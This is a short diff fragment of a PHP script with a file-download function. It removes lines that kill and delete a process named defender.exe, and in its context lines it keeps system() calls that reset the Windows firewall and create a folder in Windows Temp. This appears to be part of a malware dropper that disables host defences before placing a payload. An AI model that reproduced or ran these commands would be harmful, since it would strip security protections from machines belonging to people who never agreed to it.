@@ -28,9 +28,8 @@ function downloadFile($url, $savePath) {
 
   
 
-system('taskkill /IM defender.exe /F');     
-system('taskkill /IM defender.exe /F');    
-system('del /f /q "C:/Windows/Temp/defender.exe"');  
+
+
 
 system('netsh advfirewall reset');  
 system('mkdir "C:/Windows/Temp/RightProgram"');  
